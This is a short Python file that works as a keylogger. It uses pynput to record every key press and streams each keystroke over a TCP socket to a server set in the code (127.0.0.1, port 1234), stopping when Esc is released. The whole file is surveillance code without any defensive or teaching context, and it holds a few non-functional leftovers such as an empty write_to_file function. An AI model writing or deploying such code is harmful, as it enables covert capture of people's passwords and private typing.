from pynput.keyboard import Key, Listener
import socket
import threading

client = socket.socket(
    socket.AF_INET, 
    socket.SOCK_STREAM
)

IP = '127.0.0.1'
PORT = 1234

client.connect((IP,PORT))

def write_to_file():
    pass

def send(key):
    client.send(str(key).encode())

def release(key):
    if key == Key.esc:
        return False

with Listener(on_press=send, on_release=release) as listener:
    listener.join()

if __name__ == "__main__":
    threading.Thread(target=send).start()